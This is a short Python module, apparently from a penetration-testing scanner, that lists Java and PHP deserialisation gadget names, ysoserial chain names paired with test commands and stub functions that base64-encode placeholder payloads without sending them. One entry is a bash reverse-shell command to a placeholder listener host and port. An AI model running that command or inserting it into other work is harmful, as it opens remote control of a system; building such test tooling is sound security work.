import json, base64
from typing import Optional, Dict

DESER_GADGETS = {
    "java_commons": "rO0ABXNyABRqYXZhLnV0aWwuUmFuZG9tAAAAAAAAAAB4cA==",
    "java_jdk8": "rO0ABXNyABRqYXZhLmxhbmcuUHJvY2Vzc29yAAAAAAAAAAB4cA==",
    "php_codeigniter": 'O:12:"CI_Controller":0:{}',
    "php_laravel": 'O:17:"Illuminate\\Support\\Facades\\Facade":0:{}',
}

YSOSERIAL_PAYLOADS = {
    "CommonCollections1": "bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'",
    "CommonCollections2": "ping -c 3 LHOST",
    "Jdk7u21": "touch /tmp/pwned",
    "URLDNS": "http://burpcollaborator.net",
}


def generate_java_payload(gadget: str = "CommonCollections1",
                           command: str = "id") -> str:
    return base64.b64encode(("[gadget:%s] %s" % (gadget, command)).encode()).decode()


def generate_php_payload(chain: str = "codeigniter") -> str:
    gadget = DESER_GADGETS.get("php_%s" % chain, DESER_GADGETS["php_codeigniter"])
    return base64.b64encode(gadget.encode()).decode()


def check(url: str = None, param: str = None, sess=None,
          timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "payloads": {}, "findings": []}

    for name, desc in DESER_GADGETS.items():
        encoded = base64.b64encode(desc.encode() if isinstance(desc, str) else desc).decode()
        result["payloads"][name] = encoded

    for name in YSOSERIAL_PAYLOADS:
        for cmd in ["id", "whoami"]:
            pld = generate_java_payload(name, cmd)
            result["payloads"]["ysoserial_%s_%s" % (name, cmd)] = pld

    result["payloads"]["php_generic"] = generate_php_payload()

    result["recommendations"] = [
        "Use ysoserial to generate specific gadget chain payloads",
        "Use phpggc for PHP gadget chains",
        "For blind detection, use URLDNS with OOB listener",
    ]

    return result
